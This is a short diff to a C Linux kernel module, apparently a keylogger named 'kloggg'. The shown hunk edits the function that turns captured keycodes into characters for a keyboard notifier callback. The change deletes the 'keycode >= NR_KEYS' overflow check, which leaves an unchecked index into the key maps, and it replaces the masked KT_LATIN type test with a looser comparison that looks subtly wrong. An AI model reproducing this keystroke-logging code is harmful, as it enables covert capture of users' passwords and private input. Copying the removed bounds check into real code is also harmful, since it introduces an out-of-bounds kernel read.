@@ -45,23 +45,18 @@ static struct proc_ops kloggg_fops = {
 
 
 static char kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
-  u_short symbol;
+    u_short symbol;
+    if (shift_mask & (1 << KG_SHIFT)) {
+        symbol = shift_map[keycode];
+    } else {
+        symbol = plain_map[keycode];
+    }
 
-  if (keycode >= NR_KEYS)  // prevent overflow
-    return '?';
-
-  if (shift_mask & (1 << KG_SHIFT)) {
-    symbol = shift_map[keycode];
-  } else {
-    symbol = plain_map[keycode];
-  }
-
-  // Check for normal character type
-  if (((symbol >> 8) & 0xff) == KT_LATIN) {
-    return symbol & 0xff;  // return ASCII value
-  } else {
-    return '?';  // non-ASCII or control key
-  }
+    if ((symbol >> 8) == 0) { // KT_ASCII
+        return symbol & 0xFF;
+    } else {
+        return '?'; // not a printable ASCII character
+    }
 }
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
